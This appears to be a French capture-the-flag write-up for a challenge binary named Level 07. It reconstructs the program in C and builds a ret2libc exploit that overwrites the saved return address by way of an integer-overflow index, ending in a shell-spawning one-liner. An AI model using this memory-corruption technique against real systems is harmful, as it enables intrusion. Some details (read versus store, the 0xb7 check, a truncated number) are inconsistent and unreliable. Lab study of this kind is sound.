# Level 07

## Analyse du binaire

Lorsqu'on exécute le binaire, une "commande" est attendue sur l'entrée standard. On a le choix entre :

- **read** : lit un nombre à un index voulu
- **store** : stocke un nombre voulu à un index voulu
- **quit** : quitte le programme

Le code asm est assez long, on retrouve notamment les instructions :

- Initialisation de tableau :

```asm
rep stos DWORD PTR es:[edi],eax
```

- Calcul de la longueur d'une chaîne de caractère :

```asm
repnz scas al,BYTE PTR es:[edi]
```

- Comparaison entre deux chaînes de caractères :

```asm
repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
```

- Division d'un nombre par 3, en faisant une multiplication par `2^33 / 3 = 0xaaaaaaab` (voir sources) :

```asm
mov    DWORD PTR [ebp-0xc],eax
mov    ecx,DWORD PTR [ebp-0xc]
mov    edx,0xaaaaaaab
mov    eax,ecx
mul    edx
shr    edx,1
```

On peut réécrire un code source en C :

```c
void clear_stdin(void)
{
	int c; // ebp-0x9

	c = 0;
	while (c != 0xff)
	{
		c = getchar();
		if (c == '\n')
			return;
	}
}

int get_unum(void)
{
	uint nb; // ebp-0xc

	nb = 0;
	fflush(stdout);
	scanf("%u", &nb);
	clear_stdin();
	return nb;
}

int read_number(char *data)
{
	uint index; // ebp-0xc

	printf(" Index: ");
	index = get_unum();
	printf(" Number at data[%u] is %u\n", index, data[index << 2]);
	return 0;
}

int store_number(char *data)
{
	uint nb;	// ebp-0x10
	uint index; // ebp-0xc

	nb = 0;
	index = 0;
	printf(" Number: ");
	nb = get_unum();
	printf(" Index: ");
	index = get_unum();

	uint tmp = index / 3;
	tmp *= 3;

	if (index - tmp == 0 || nb >> 24 != 0xb7)
	{
		puts(" *** ERROR! ***");
		puts("   This index is reserved for wil!");
		puts(" *** ERROR! ***");
		return 1;
	}
	data[index << 2] = nb; // same as ((uint32*)data)[index]
	return 0;
}

int main(int argc, const char **argv, char **envp)
{
	char command[20];		 // esp+0x1b8 - esp+0x1c8
	uint has_command_failed; // esp+0x1b4
	char *data[400];		 // esp+0x24
	char **av;				 // esp+0x1c
	char **env;				 // esp+0x18

	av = argv;
	env = envp;
	has_command_failed = 0;
	bzero(command, 20);
	bzero(data, 400);

	while (av[0] != NULL)
	{
		memset(av[0], 0, strlen(av[0]));
		av += 4;
	}

	while (env[0] != NULL)
	{
		memset(env[0], 0, strlen(env[0]));
		env += 4;
	}

	puts("----------------------------------------------------");
	puts("   Welcome to wil's crappy number storage service!  ");
	puts("----------------------------------------------------");
	puts("Commands:");
	puts("    store - store a number into the data storage");
	puts("    read  - read a number from the data storage");
	puts("    quit  - exit the program");
	puts("----------------------------------------------------");
	puts("   wil has reserved some storage :");
	puts("----------------------------------------------------");

	while (1)
	{
		printf("Input command: ");
		has_command_failed = 1;
		fgets(command[1], 20, stdin);

		command[strlen(command) - 1] = '\0';

		if (!strncmp(command, "store", 5))
			has_command_failed = store_number(data);
		else if (!strncmp(command, "read", 4))
			has_command_failed = read_number(data);
		else if (!strncmp(command, "quit", 4))
			return 0;

		if (has_command_failed)
			printf(" Failed to do %s command\n", command);
		else
			printf(" Completed %s command successfully\n", command);

		bzero(command, 20);
	}
}
```

## Exploit

On se doute qu'il faut utiliser la commande **read** pour écraser des valeurs intéressantes de la mémoire. En regardant le code de la fonction _store_number_, on remarque que notre index subit un décalage binaire à gauche de 2, soit une multiplication par 4. Le nombre que nous allons donné à la commande read sera donc stocké à l'adresse `DATA_ADDR + INDEX * 4`.

Cependant, on note aussi que l'index ne doit pas être un multiple de 3 et que le 1er octet du nombre que ne voulons stocké doit être différent de `0xb7`.

On peut essayer de faire un **ret2libc** pour lancer un shell. Pour ce faire, il nous faut l'adresse de la fonction _system_ et une adresse pointant sur la chaîne de caractères "/bin/sh". De plus on a besoin de l'adresse de notre buffer et l'**eip sauvegardé** de la fonction **main** à écraser. Comme vu au level04, avec gdb on obtient les adresses suivantes :

- system `0xf7e6aed0` (hex) = `4159090384` (dec)
- "/bin/sh" `0xf7f897ec` (hex) = `4160264172` (dec)
- eip `0xffffd60c`
- buffer `0xffffd444`

On doit donc :

- stocker l'adresse de la fonction _system_ à l'**eip sauvegardé**
- stocker l'adresse de la chaîne de caractères "/bin/sh" à **eip sauvegardé + 4**
- quitter le programme pour sortir de la fonction _main_ et exécuter la fonction système

On commence par faire la différence entre l'adresse de notre buffer et l'**eip sauvegardé** : `0xffffd60c - 0xffffd444 = 1C8 (hex) = 456 (dec)`. On doit donc diviser ce nombre par 4, ce qui nous donne 114. Problème : cet index est un multiple de 3 et la condition n'est donc pas respectée dans la fonction _store_number_. Sachant que la condition sur la division par 3 est fait **avant** le décalage binaire, on peut modifier les 2 premiers bits de notre index, puisque lors du décalage ces derniers vont "disparaître". On peut donc par exemple modifier le 1er bit à 1 ce qui nous donne :

```
0000 0000 0000 0000 0000 0000 0111 0010 (bin) =       72 (hex) =        114 (dec)
1000 0000 0000 0000 0000 0000 0111 0010 (bin) = 80000072 (hex) = 2147483762 (dec)
```

Le nombre 214748376 n'est pas un multiple de 3 : `2147483762 = 3 * 715827920 + 2`.

Pour l'index suivant qui est 116, cela ne pose pas de problème car il n'est pas un multiple de 3.

Finalement on exécute la commande :

```bash
(echo "store" ; echo "4159090384" ; echo "2147483762" ; echo "store"; echo "4160264172" ; echo "116" ; echo "quit"; cat) | ./level07
```

## Sources

- https://stackoverflow.com/questions/63417818/why-does-division-by-3-require-a-rightshift-and-other-oddities-on-x86
- https://aakinshin.net/posts/perfex-div/
